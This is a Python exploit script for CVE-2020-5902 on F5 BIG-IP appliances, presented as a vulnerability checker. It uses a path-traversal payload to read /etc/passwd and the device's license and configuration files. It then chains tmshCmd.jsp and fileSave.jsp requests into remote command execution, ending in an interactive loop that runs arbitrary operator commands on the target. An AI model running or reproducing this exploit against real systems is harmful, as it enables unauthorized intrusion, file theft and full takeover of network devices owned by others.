import requests, argparse, json
import warnings; warnings.filterwarnings('ignore', message='Unverified HTTPS request')
parser = argparse.ArgumentParser(description="Python script to check CVE-2020-5902 (F5 BIG-IP devices).")
parser.add_argument('-i', required=True, default=None, help='Enter the target ip <IP>.')
args = vars(parser.parse_args())
ip = args['i']
print('- Python script to check CVE-2020-5902 (F5 BIG-IP devices). | coded by Abdullah AlZahrani')


headers = {
    'Host': '{}'.format(ip),
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '62',
    'Connection': 'close',
}

def checkerCVE20205902():
    payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp'
    files = ['/etc/passwd', '/etc/hosts', '/config/bigip.license', '/config/bigip.conf']
    print('[!] Your target: {}'.format(ip))
    for line in files:
        params = (('fileName', '{}'.format(line)),)
        try:
            response = requests.get('https://{}{}'.format(ip, payload), params=params, verify=False)
            if response.status_code == 200:
                vulnerable = True
                print("[I] {} readable".format(line))
                print('[PoC] https://{}{}?fileName={}\n'.format(ip, payload, line))
        except requests.exceptions.HTTPError as errh:
            print("Http Error:", errh)
        except requests.exceptions.ConnectionError as errc:
            print("Error Connecting:", errc)
        except requests.exceptions.Timeout as errt:
            print("Timeout Error:", errt)
        except requests.exceptions.RequestException as err:
            print("OOps: Something Else", err)
    if vulnerable:
        print("[I] The target is vulnerable to CVE-2020-5902")
    else:
        print("[!] The target is not vulnerable to CVE-2020-5902")


def check():
    print("[*] Check if the target vulnerable to RCE")
    try:
        # req 1
        createCLI = 'command=create%20cli%20alias%20private%20list%20command%20bash'
        response = requests.post('https://{}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp'.format(ip),
                                 headers=headers, data=createCLI, verify=False)

        # req 2
        createFileWithCommand = 'fileName=/tmp/Lx6QYehfpoNAPpHTPraQp&content=echo "RCE"'
        response = requests.post('https://{}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp'.format(ip),
                                 headers=headers, data=createFileWithCommand, verify=False)

        # req 3
        executeCommand = 'command=list%20/tmp/Lx6QYehfpoNAPpHTPraQp'
        response = requests.post('https://{}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp'.format(ip),
                                 headers=headers, data=executeCommand, verify=False).text
        output = json.loads(response)
        if "RCE" in output['output'].replace('\n', ''):
            print("[#] The target is vulnerable to RCE, let's GO.")
            vulnerable = True
            return vulnerable
    except:
        exit("[-] The target is not vulnerable to RCE")

def executeCommand():
    while True:
        command = input('Command > ')
        # req 1
        createCLI = 'command=create%20cli%20alias%20private%20list%20command%20bash'
        response = requests.post('https://{}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp'.format(ip), headers=headers, data=createCLI, verify=False)

        # req 2 
        createFileWithCommand = 'fileName=/tmp/Lx6QYehfpoNAPpHTPraQp&content={}'.format(command)
        response = requests.post('https://{}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp'.format(ip), headers=headers, data=createFileWithCommand, verify=False)

        # req 3
        executeCommand = 'command=list%20/tmp/Lx6QYehfpoNAPpHTPraQp'
        response = requests.post('https://{}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp'.format(ip), headers=headers, data=executeCommand, verify=False).text
        output = json.loads(response)
        print(output['output'].replace('\n', ''))

if __name__ == '__main__':
    try:
        checkerCVE20205902()
        vulnerable = check()
        if vulnerable:
            executeCommand()
        else:
            print('[-] The target is not vulnerable to RCE')
    except KeyboardInterrupt:
        exit('[!] Exiting!')
